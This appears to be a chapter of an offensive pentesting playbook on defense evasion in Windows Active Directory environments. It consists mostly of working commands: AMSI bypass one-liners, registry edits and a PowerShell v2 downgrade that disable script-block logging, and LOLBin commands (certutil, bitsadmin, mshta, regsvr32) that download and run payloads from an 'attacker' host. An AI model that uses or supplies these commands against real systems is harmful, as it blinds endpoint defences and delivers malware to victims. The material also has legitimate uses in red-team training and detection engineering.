---
title: "25 · Defense Evasion & OPSEC"
---

# 25 · Defense Evasion & OPSEC

> AMSI bypass, PowerShell logging bypass, LOLBins.

!!! note "Phase overview"
    `AMSI (Anti-Malware Scan Interface)` lets EDR scan PowerShell scripts before execution. Two canonical bypasses: corrupt the AmsiContext, or patch AmsiScanBuffer. PowerShell v2 has no script-block logging at all. LOLBins (certutil, bitsadmin, mshta) let you download/execute without dropping obvious tooling.

### 25.1 · AMSI Bypass

!!! info "Why this works / how it chains"

    Three families: in-memory amsiInitFailed flag flip, amsiSession nullification, or Invisi-Shell launcher (which spawns a PowerShell child without script-block logging at all).

```powershell title="Three AMSI bypasses"
# Some examples:

# Method 1: AmsiContext corruption
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: AmsiScanBuffer patch
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiSession','NonPublic,Static')
$b.SetValue($null,$null)

# Method 3: Invisi-Shell (bypass script block logging)
.\InvisiShell\RunWithPathAsAdmin.bat       # admin
.\InvisiShell\RunWithRegistryNonAdmin.bat  # non-admin
```


### 25.2 · PowerShell Logging Bypass

!!! info "Why this works / how it chains"

    Disable script block logging registry-side, or downgrade to PS v2 (which doesn't have it). Constrained Language Mode also bypassable via PSBypassCLM or PS2 downgrade.

```powershell title="Disable / downgrade"
# Disable script block logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Use PowerShell v2 (no logging)
powershell -version 2 -command "Get-Process"

# Constrained Language Mode bypass
# Use PSBypassCLM or downgrade to PS2
```


### 25.3 · LOLBins for AD Attacks

!!! info "Why this works / how it chains"

    Living-off-the-land binaries that AV/EDR rarely flag because they're signed Microsoft tools. certutil downloads files, bitsadmin uses BITS jobs, mshta executes HTA payloads, wmic creates remote processes, regsvr32 loads COM scriptlets.

```bash title="Download / execute LOLBin patterns"
# certutil - download files
certutil -urlcache -f http://attacker/shell.exe shell.exe
certutil -decode encoded.b64 output.exe

# bitsadmin - download files
bitsadmin /transfer job http://attacker/shell.exe C:\shell.exe

# mshta - execute scripts
mshta http://attacker/payload.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run""cmd /c whoami""")

# wmic - execute commands
wmic process call create "cmd /c whoami > C:\output.txt"
wmic /node:TARGET process call create "cmd /c whoami"

# regsvr32 - COM scriptlet
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll

# rundll32
rundll32 javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"cmd /c whoami\",0,true);window.close();");
```

